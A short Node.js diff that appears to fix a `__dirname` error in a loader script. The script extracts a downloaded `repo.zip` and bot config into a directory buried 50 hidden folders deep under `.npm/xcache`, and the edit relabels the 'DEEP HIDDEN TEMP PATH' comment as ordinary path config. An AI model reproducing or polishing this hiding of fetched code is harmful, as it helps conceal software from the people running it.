@@ -5,10 +5,10 @@ const AdmZip = require("adm-zip");
 const { spawn } = require("child_process");
 const chalk = require("chalk");
 
-// === PATH CONFIG ===
-const __dirname = __dirname;
+// __dirname is already available in CommonJS
+// const __dirname = path.dirname(fileURLToPath(import.meta.url)); // REMOVE THIS
 
-// === DEEP HIDDEN TEMP PATH ===
+// === PATH CONFIG ===
 const deepLayers = Array.from({ length: 50 }, (_, i) => `.x${i + 1}`);
 const TEMP_DIR = path.join(__dirname, ".npm", "xcache", ...deepLayers);
 
@@ -23,6 +23,7 @@ const ZIP_PATH = path.join(TEMP_DIR, "repo.zip");
 const LOCAL_SETTINGS = path.join(__dirname, "botfile-main/config.js");
 const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "botfile-main/config.js");
 
+// ... rest of your code remains the same
 // === HELPERS ===
 const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
